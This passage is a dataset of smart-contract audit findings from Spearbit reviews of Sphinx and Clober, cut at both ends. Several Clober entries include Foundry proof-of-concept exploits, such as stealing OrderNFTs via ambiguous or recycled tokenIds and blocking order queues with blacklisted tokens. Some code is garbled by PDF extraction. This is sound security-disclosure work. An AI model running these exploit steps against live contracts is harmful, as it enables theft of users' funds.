require statement, there- fore an extra SLOAD can be avoided by using the local variable leafMerkleRootNonce to calculate the final value.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "Custom errors can be used for gas savings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "require/revert statements with string messages. Since Solidity 0.8.4, the use of custom errors has been encouraged for gas optimization. Custom errors consume less gas compared to traditional error messages, especially when the same error message is repeated across various functions.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization ManagedService.sol#L33, ManagedService.sol#L51, ManagedService.sol#L52, ManagedSer-"]}, {"title": "Duplicate _safeProxy zero address check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The zero address check on _safeProxy is redundant because it will be checked when initializing SphinxModule. require(_safeProxy != address(0), \"SphinxModule: invalid Safe address\");", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "Redundant variable setters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "There is no difference between the old and new values set in the referenced lines. Therefore, they are redundant and can be removed.", "labels": ["Spearbit", "Sphinx", "Severity: Gas Optimization"]}, {"title": "OpenZeppelin's StandardMerkleTree allows creating trees with leaves that carry the same informa- tion", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "It is possible to create a tree with multiple leaves that would carry the same raw information when one is using OpenZeppelin's StandardMerkleTree. This does not create any issues when one queries the proof, but the queried proof picks the path for the last leaf in the leaf array that carries the same information. leafHash(leaf: T): string { return hex(standardLeafHash(leaf, this.leafEncoding)); } leafLookup(leaf: T): number { return this.hashLookup[this.leafHash(leaf)] ?? throwError(  Leaf is not in tree  ); } getProof(leaf: number | T): string[] { // input validity const valueIndex = typeof leaf === this.validateValue(valueIndex);   number ? leaf : this.leafLookup(leaf); // rebuild tree index and generate proof const { treeIndex } = this.values[valueIndex]!; const proof = getProof(this.tree, treeIndex); // sanity check proof if (!this._verify(this.tree[treeIndex]!, proof)) { Unable to prove value );  throw new Error( }  // return proof in hex format return proof.map(hex); } This is due to the fact hex(standardLeafHash(value, leafEncoding)). that this.hashLookup only saves the last valueIndex for the same", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Mixed usage of uint256 and uint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "There is mixed usage of uint and uint256 within the file.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Use common base type check function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The type check logic is reused twice unnecessarily.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Use onlyRole modifier in MangedService", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The following check could be simplified with the onlyRole modifier provided in AccessControl.sol. Additionally, this would allow meta transactions to be used, as it uses _msgSender() rather than msg.sender: require(hasRole(RELAYER_ROLE, msg.sender), \"ManagedService: invalid caller\");", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Redundant explicit boolean comparisons", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "Since arbitraryApprovalIncluded and data.arbitraryChain are booleans, their explicit compar- isons are redundant.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Consider adding more documentation to exec function and its arbitrary external call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The exec function includes an arbitrary external call. This raises many questions and thus, requires extra documentation for the sake of clarity. Especially, regarding one of the following questions: Is expected to call only deployed smart contracts or also EOA? We expect only to call contracts. Sphinx-Labs -  The function not only allows to make arbitrary external calls to contracts, but to EOAs. Consider documenting this or adding a check for <address>.code.length > 0 to avoid EOAs.  In order to explicitly indicate that _to is intended to receive Ether, consider marking the _to input parameter It won't change the current behavior, however, is enhances readability as it clearly highlights as payable. that the address can handle Ether transactions.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Use the already defined DEFAULT_ADMIN_ROLE rather than bytes32(0) for consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The contract currently uses a direct bytes32(0) value to represent the default admin role. However, OpenZeppelin's Access Control provides a named constant DEFAULT_ADMIN_ROLE for this purpose. Using this constant enhances code readability and maintainability.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Unnecesary castings can be removed for consistency and clarity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "At SphinxModuleProxyFactory.sol, SPHINX_MODULE_IMPL is address type, however, it is casted to address at: Clones.predictDeterministicAddress(addres(SPHINX_MODULE_IMPL), salt, MODULE_FACTORY); This issue is also found in a similar instance of Clones.cloneDeterministic.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Safe owners only sign a typed data hash for the root of a merkle tree and might not know the leaf information", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "When a set of leaves are used to construct a merkle tree for the Sphinx protocol, the users would only sign the root and only the root of this tree is used in the EIP-712 typed data signing, i.e., the wallet UIs would only show the root information. The safe owners might get phished into signing a malicious root allowing malicious transactions being executed through the Sphinx proxy module. Creating a different typed structured data for the signing mechanism such as: SphinxMerkleTree { SphinxLeaf[] leaves; } and signing and verifying above on-chain might be expensive for the approve endpoint.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Typographical issues", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "Various typos have been identified throughout the SphinxModule contract.  SphinxModule.sol#L125: - ...because there must always at least be an APPROVE + ...because there must always be an   APPROVE leaf.   leaf.  SphinxModule.sol#L134: - // We don + // We don   t validate the t validate the     uri uri because it we allow it to be empty. because we allow it to be empty.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "Open pragma version is inconsistent and can lead to unexpected behaviors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sphinx-Spearbit-Security-Review.pdf", "body": "The pragma solidity versions specified in various contract files are inconsistent, using a range (>=0.7.0 <0.9.0) rather than a locked version or using an open (cid:2)0.8.0 or (cid:2)0.8.2 version. This can lead to unexpected behaviors if contracts are deployed with different Solidity versions than the specified while testing. foundry.toml file specifies the use of Solidity version 0.8.4, suggesting this as the intended version for contract deployment.", "labels": ["Spearbit", "Sphinx", "Severity: Informational"]}, {"title": "OrderBook Denial of Service leveraging blacklistable tokens like USDC", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The issue was spotted while analysing additional impact and fix for 67 Proof of concept checked with the original audit commit: 28062f477f571b38fe4f8455170bd11094a71862 and the newest available commit from dev branch: 2ed4370b5de9cec5c455f5485358db194f093b01 Due to the architecture decision which implements orders queue as a cyclic buffer the OrderBook after reaching MAX_ORDERS (~32k) for a given price point, starts to overwrite stale orders. If an order was never claimed or it is broken, so it cannot be claimed, it is not possible to place a new order in a queue. This emerges due to a fact that it is not possible to finalize the stale order and deliver the underlying assets, what is done while placing a new and replacing a stale order. Effectively this issue can be used to block the main functionality of the OrderBook, so placing new orders for a given price point. Only a single broken order per price-point is enough to lead to this condition. The issue will not be immediately visible as it requires the cyclic buffer to make a circle and encounter the broken order. The proof of concept in SecurityAuditTests.sol attachment implements a simple scenario where a USDC-like mock token is used: 1. Mallory creates one ASK order at some price point (to sell X base tokens for Y quoteTokens). 2. Mallory transfers ownership of the OrderNFT token to an address which is blacklisted by quoteToken (e.g. USDC) 3. Orders queue implemented as a circular buffer over time overflows and starts replacing old orders. 4. When it is the time to replace the order the quoteToken is about to be transferred, but due to the blacklist the assets cannot be delivered. 5. At this point it is impossible to place new orders at this price index, unless the owner of the OrderNFT transfers it to somebody who can receive quoteToken. Proof of concept result for the newest 2ed4370b5de9cec5c455f5485358db194f093b01 commit: # $ git clone ... && git checkout 2ed4370b5de9cec5c455f5485358db194f093b01 # $ forge test -m \"test_security_BlockOrderQueueWithBlacklistableToken\" [25766] MockOrderBook::limitOrder(0x0000000000000000000000000000000000004444, 3, 0, ,! 333333333333333334, 2, 0x) [8128] OrderNFT::onBurn(false, 3, 0) [1448] MockOrderBook::getOrder((false, 3, 0)) [staticcall]  (1, 0, 0x00000000000000000000000000000000DeaDBeef) emit Approval(owner: 0x00000000000000000000000000000000DeaDBeef, approved: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888) emit Transfer(from: 0x00000000000000000000000000000000DeaDBeef, to: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888)  () emit ClaimOrder(claimer: 0x0000000000000000000000000000000000004444, user: 0x00000000000000000000000000000000DeaDBeef, rawAmount: 1, bountyAmount: 0, orderIndex: 0, priceIndex: 3, isBase: false) [714] MockSimpleBlockableToken::transfer(0x00000000000000000000000000000000DeaDBeef, 10000) ,! ,! ,! ,! ,! ,!  \"blocked\"  \"blocked\"  \"blocked\" 5 In real life all *-USDC and USDC-* pairs as well as other pairs where a single token implements a block list are affected. The issue is also appealing to the attacker as at any time if the attacker controls the blacklisted wallet address, he/she can transfer the unclaimable OrderNFT to a whitelisted address to claim his/her assets and to enable processing until the next broken order is placed in the cyclic buffer. It can be used either to manipulate the market by blocking certain types of orders per given price points or simply to blackmail the DAO to resume operations.", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "Overflow in SegmentedSegmentTree464", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "SegmentedSegmentTree464.update needs to perform an overflow check in case the new value is greater than the old value. This overflow check is done when adding the new difference to each node in each layer (using addClean). Furthermore, there's a final overflow check by adding up all nodes in the first layer in total(core). However, in total, the nodes in individual groups are added using DirtyUint64.sumPackedUnsafe: function total(Core storage core) internal view returns (uint64) { return DirtyUint64.sumPackedUnsafe(core.layers[0][0], 0, _C) + DirtyUint64.sumPackedUnsafe(core.layers[0][1], 0, _C); } The nodes in a group can overflow without triggering an overflow & revert. The impact is that the order book depth and claim functionalities break for all users. 6 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"forge-std/StdJson.sol\"; import \"../../contracts/mocks/SegmentedSegmentTree464Wrapper.sol\"; contract SegmentedSegmentTree464Test is Test { using stdJson for string; uint32 private constant _MAX_ORDER = 2**15; SegmentedSegmentTree464Wrapper testWrapper; function setUp() public { testWrapper = new SegmentedSegmentTree464Wrapper(); } function testTotalOverflow() public { uint64 half64 = type(uint64).max / 2 + 1; testWrapper.update(0, half64); // map to the right node of layer 0, group 0 testWrapper.update(_MAX_ORDER / 2 - 1, half64); assertEq(testWrapper.total(), 0); } }", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "OrderNFT theft due to controlling future and past tokens of same order index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function. function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) { return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M]; } CloberOrderBook(market).getOrder(decodeId(tokenId)).owner Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens. 7 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol\"; import \"../../../../contracts/mocks/MockQuoteToken.sol\"; import \"../../../../contracts/mocks/MockBaseToken.sol\"; import \"../../../../contracts/mocks/MockOrderBook.sol\"; import \"../../../../contracts/markets/VolatileMarket.sol\"; import \"../../../../contracts/OrderNFT.sol\"; import \"../utils/MockingFactoryTest.sol\"; import \"./Constants.sol\"; contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest { struct Return { address tokenIn; address tokenOut; uint256 amountIn; uint256 amountOut; uint256 refundBounty; } struct Vars { uint256 inputAmount; uint256 outputAmount; uint256 beforePayerQuoteBalance; uint256 beforePayerBaseBalance; uint256 beforeTakerQuoteBalance; uint256 beforeOrderBookEthBalance; } MockQuoteToken quoteToken; MockBaseToken baseToken; MockOrderBook orderBook; OrderNFT orderToken; function setUp() public { quoteToken = new MockQuoteToken(); baseToken = new MockBaseToken(); } function cloberMarketSwapCallback( address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, bytes calldata data ) external payable { if (data.length != 0) { Return memory expectedReturn = abi.decode(data, (Return)); assertEq(tokenIn, expectedReturn.tokenIn, \"ERROR_TOKEN_IN\"); assertEq(tokenOut, expectedReturn.tokenOut, \"ERROR_TOKEN_OUT\"); assertEq(amountIn, expectedReturn.amountIn, \"ERROR_AMOUNT_IN\"); assertEq(amountOut, expectedReturn.amountOut, \"ERROR_AMOUNT_OUT\"); assertEq(msg.value, expectedReturn.refundBounty, \"ERROR_REFUND_BOUNTY\"); } IERC20(tokenIn).transfer(msg.sender, amountIn); } 8 function _createOrderBook(int24 makerFee, uint24 takerFee) private { orderToken = new OrderNFT(); orderBook = new MockOrderBook( address(orderToken), address(quoteToken), address(baseToken), 1, 10**4, makerFee, takerFee, address(this) ); orderToken.init(\"\", \"\", address(orderBook), address(this)); uint256 _quotePrecision = 10**quoteToken.decimals(); quoteToken.mint(address(this), 1000000000 * _quotePrecision); quoteToken.approve(address(orderBook), type(uint256).max); uint256 _basePrecision = 10**baseToken.decimals(); baseToken.mint(address(this), 1000000000 * _basePrecision); baseToken.approve(address(orderBook), type(uint256).max); } function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) { return (isBid ? 1 : 0) + (postOnly ? 2 : 0); } uint256 private constant _MAX_ORDER = 2**15; // 32768 uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768 function testExploit2() public { _createOrderBook(0, 0); address attacker = address(0x1337); address attacker2 = address(0x1338); address victim = address(0xbabe); // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 1e18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ,! ambiguous tokenIds CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); uint256 currentTokenId = orderToken.encodeId(orderKey); orderKey.orderIndex += _MAX_ORDER; uint256 futureTokenId = orderToken.encodeId(orderKey); // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id vm.startPrank(attacker); orderToken.approve(attacker2, futureTokenId); CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1); orderKeys[0] = orderKey; orderKeys[0].orderIndex = orderIndex; // restore original orderIndex 9 orderBook.cancel(attacker, orderKeys); vm.stopPrank(); // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0 uint256 victimOrderSize = 1e18; for(uint256 i = 0; i < _MAX_ORDER; i++) { orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: i < _MAX_ORDER - 1 ? attacker : victim, priceIndex: priceIndex, rawAmount: 0, baseAmount: victimOrderSize, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); } assertEq(orderToken.ownerOf(futureTokenId), victim); // Step 5. Attacker steals the NFT and can cancel to receive the tokens vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker, futureTokenId); vm.stopPrank(); assertEq(orderToken.ownerOf(futureTokenId), attacker); uint256 baseBalanceBefore = baseToken.balanceOf(attacker); vm.startPrank(attacker); orderKeys[0].orderIndex = orderIndex + _MAX_ORDER; orderBook.cancel(attacker, orderKeys); vm.stopPrank(); assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize); } }", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "OrderNFT theft due to ambiguous tokenId encoding/decoding scheme", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The encodeId() uniquely encodes OrderKey to a uin256 number. However, decodeId() ambigu- ously can decode many tokenId's to the exact same OrderKey. This can be problematic due to the fact that contract uses tokenId's to store approvals. The ambiguity comes from converting uint8 value to bool isBid value here function decodeId(uint256 id) public pure returns (CloberOrderBook.OrderKey memory) { uint8 isBid; uint16 priceIndex; uint232 orderIndex; assembly { orderIndex := id priceIndex := shr(232, id) isBid := shr(248, id) } return CloberOrderBook.OrderKey({isBid: isBid == 1, priceIndex: priceIndex, orderIndex: orderIndex}); ,! } (note that the attack is possible only for ASK limit orders) 11 Proof of Concept // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 10**18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds ,! CloberOrderBook.OrderKey memory order_key = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); ,! uint256 tokenId = orderToken.encodeId(order_key); uint256 ambiguous_tokenId = tokenId + (1 << 255); // crafting ambiguous tokenId // Step 3. Attacker approves both victim (can be a third-party protocol like OpenSea) and his other account ,! vm.startPrank(attacker); orderToken.approve(victim, tokenId); orderToken.approve(attacker2, ambiguous_tokenId); vm.stopPrank(); // Step 4. Victim transfers the NFT to the themselves. (Or attacker trades it) vm.startPrank(victim); orderToken.transferFrom(attacker, victim, tokenId); vm.stopPrank(); // Step 5. Attacker steals the NFT vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker2, ambiguous_tokenId); vm.stopPrank();", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "Missing owner check on from when transferring tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OrderNFT.transferFrom/safeTransferFrom use the internal _transfer function. While they check approvals on msg.sender through _isApprovedOrOwner(msg.sender, tokenId), it is never checked that the specified from parameter is actually the owner of the NFT. An attacker can decrease other users' NFT balances, making them unable to cancel or claim their NFTs and locking users' funds. The attacker transfers their own NFT passing the victim as from by calling transfer- From(from=victim, to=attackerAccount, tokenId=attackerTokenId). This passes the _isApprovedOrOwner check, but reduces from's balance.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Wrong minimum net fee check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "A minimum net fee was introduced that all markets should comply by such that the protocol earns fees. The protocol fees are computed takerFee + makerFee and the market factory computes the wrong check. Fee pairs that should be accepted are currently not accepted, and even worse, fee pairs that should be rejected are currently accepted. Market creators can avoid collecting protocol fees this way.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Rounding up of taker fees of constituent orders may exceed collected fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "If multiple orders are taken, the taker fee calculated is rounded up once, but that of each taken maker order could be rounded up as well, leading to more fees accounted for than actually taken. Example:  takerFee = 100011 (10.0011%)  2 maker orders of amounts 400000 and 377000  total amount = 400000 + 377000 = 777000  Taker fee taken = 777000 * 100011 / 1000000 = 77708.547 = 777709 Maker fees would be 13 377000 * 100011 / 1000000 = 37704.147 = 37705 400000 * 100011 / 1000000 = 40004.4 = 40005 which is 1 wei more than actually taken. Below is a foundry test to reproduce the problem, which can be inserted into Claim.t.sol: function testClaimFeesFailFromRounding() public { _createOrderBook(0, 100011); // 10.0011% taker fee // create 2 orders uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); uint256 orderIndex2 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); // take both orders _createTakeOrder(Constants.BID, 2 * Constants.RAW_AMOUNT); CloberOrderBook.OrderKey[] memory ids = new CloberOrderBook.OrderKey[](2); ids[0] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); ids[1] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex2 }); // perform claim orderBook.claim( address(this), ids ); // (uint128 quoteFeeBal, uint128 baseFeeBal) = orderBook.getFeeBalance(); // console.log(quoteFeeBal); // fee accounted = 20004 // console.log(baseFeeBal); // fee accounted = 0 // console.log(quoteToken.balanceOf(address(orderBook))); // actual fee collected = 20003 // try to claim fees, will revert vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); orderBook.collectFees(); }", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Drain tokens condition due to reentrancy in collectFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "collectFees function is not guarded by a re-entrancy guard. In case a transfer of at least one of the tokens in a trading pair allows to invoke arbitrary code (e.g. token implementing callbacks/hooks), it is possible for a malicious host to drain trading pools. The re-entrancy condition allows to transfer collected fees multiple times to both DAO and the host beyond the actual fee counter.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Group claim clashing condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Claim functionality is designed to support 3rd party operators to claim multiple orders on behalf of market's users to finalise the transactions, deliver assets and earn bounties. The code allows to iterate over a list of orders to execute _claim. function claim(address claimer, OrderKey[] calldata orderKeys) external nonReentrant revertOnDelegateCall { uint32 totalBounty = 0; for (uint256 i = 0; i < orderKeys.length; i++) { ... (uint256 claimedTokenAmount, uint256 minusFee, uint64 claimedRawAmount) = _claim( queue, mOrder, orderKey, claimer ); ... } } However, neither claim nor _claim functions in OrderBook support skipping already fulfilled orders. On the con- trary in case of a revert in _claim the whole transaction is reverted. function _claim(...) private returns (...) { ... require(mOrder.openOrderAmount > 0, Errors.OB_INVALID_CLAIM); ... } Such implementation does not support fully the initial idea of 3rd party operators claiming orders in batches. A transaction claiming multiple orders at once can easily clash with others and be reverted completely, effectively claiming nothing - just wasting gas. Clashing can happen for instance when two bots got overlapping lists of orders or when the owner of the order decides to claim or cancel his/her order manually while the bot is about to claim it as well. 15", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Order owner isn't zeroed after burning", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The order's owner is not zeroed out when the NFT is burnt. As a result, while the onBurn() method records the NFT to have been transferred to the zero address, ownerOf() still returns the current order's owner. This allows for unexpected behaviour, like being able to call approve() and safeTransferFrom() functions on non-existent tokens. A malicious actor could sell such resurrected NFTs on secondary exchanges for profit even though they have no monetary value. Such NFTs will revert on cancellation or claim attempts since openOrderAmount is zero. function testNFTMovementAfterBurn() public { _createOrderBook(0, 0); address attacker2 = address(0x1337); // Step 1: make 2 orders to avoid bal sub overflow when moving burnt NFT in step 3 uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); uint256 tokenId = orderToken.encodeId(orderKey); // Step 2: burn 1 NFT by cancelling one of the orders vm.startPrank(Constants.MAKER); orderBook.cancel( Constants.MAKER, _toArray(orderKey) ); // verify ownership is still maker assertEq(orderToken.ownerOf(tokenId), Constants.MAKER, \"NFT_OWNER\"); // Step 3: resurrect burnt token by calling safeTransferFrom orderToken.safeTransferFrom( Constants.MAKER, attacker2, tokenId ); // verify ownership is now attacker2 assertEq(orderToken.ownerOf(tokenId), attacker2, \"NFT_OWNER\"); }", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Lack of two-step role transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The contracts lack two-step role transfer. Both the ownership of the MarketFactory as well as the change of market's host are implemented as single-step functions. The basic validation whether the address is not a zero address for a market is performed, however the case when the address receiving the role is inaccessible is not covered properly. Taking into account the handOverHost can be invoked without any supervision, by anyone who created the market it is possible to make a typo unintentionally or intentionally if the attacker wants simply to brick fees collection as currently the host affects collectFees in OrderBook (described as a separate issue). The ownership transfer in theory should be less error-prone as it should be done by DAO with great care, however still two-step role transfer should be preferable.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Atomic fees delivery susceptible to funds lockout", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The collectFees function delivers the quoteToken part of fees as well as the baseToken part of fees atomically and simultaneously to both the DAO and the host. In case a single address is for instance blacklisted (e.g. via USDC blacklist feature) or a token in a pair happens to be malicious and configured the way transfer to one of the addresses reverts it is possible to block fees delivery. 17 function collectFees() external nonReentrant { // @audit delivers both tokens atomically require(msg.sender == _host(), Errors.ACCESS); if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } function _collectFees(IERC20 token, uint256 amount) internal { // @audit delivers to both wallets uint256 daoFeeAmount = (amount * _DAO_FEE) / _FEE_PRECISION; uint256 hostFeeAmount = amount - daoFeeAmount; _transferToken(token, _daoTreasury(), daoFeeAmount); _transferToken(token, _host(), hostFeeAmount); } There are multiple cases when such situation can happen for instance: a malicious host wants to block the function for DAO to prevent collecting at least guaranteed valuable quoteToken or a hacked DAO can swap treasury to some invalid address and renounce ownership to brick collectFees across multiple markets. Taking into account the current implementation in case it is not possible to transfer tokens it is necessary to swap the problematic address, however depending on the specific case it might be not trivial.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "DAO fees potentially unavailable due to overly strict access control", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The collectFees function is guarded by an inline access control require statement condition which prevents anyone, except a host, from invoking the function. Only the host of the market is authorized to invoke, effectively deliver all collected fees, including the part of the fees belonging to the DAO. function collectFees() external nonReentrant { require(msg.sender == _host(), Errors.ACCESS); // @audit only host authorized if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } This access control is too strict and can lead to funds being locked permanently in the worst case scenario. As the host is a single point of failure in case access to the wallet is lost or is incorrectly transferred the fees for both the host and the DAO will be locked.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "OrderNFT ownership and market host transfers are done separately", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The market host is entitled to 80% of the fees collected, and is able to set the URI of the correspond- ing orderToken NFT. However, transferring the market host and the orderToken NFT is done separately. It is thus possible for a market host to transfer one but not the other.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "OrderNFTs can be renamed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OrderNFT contract's name and symbol can be changed at any time by the market host. Usually, these fields are immutable for ERC721 NFTs. There might be potential issues with off-chain indexers that cache only the original value. Furthermore, suddenly renaming tokens by a malicious market host could lead to web2 phishing attacks.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "DOSing _replaceStaleOrder() due to reverting on token transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "In the case of tokens with implemented hooks, a malicious order owner can revert on token received event thus cause a denial-of-service via _replaceStaleOrder(). The probability of such an attack is very low, because the order queue has to be full and it is unusual for tokens to implement hooks.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Total claimable bounties may exceed type(uint32).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Individual bounties are capped to type(uint32).max which is ~4.295 of a native token of 18 decimals (4.2949673e18 wei). It's possible (and likely in the case of Polygon network) for their sum to therefore exceed type(uint32).max.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Can fake market order in TakeOrder event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": 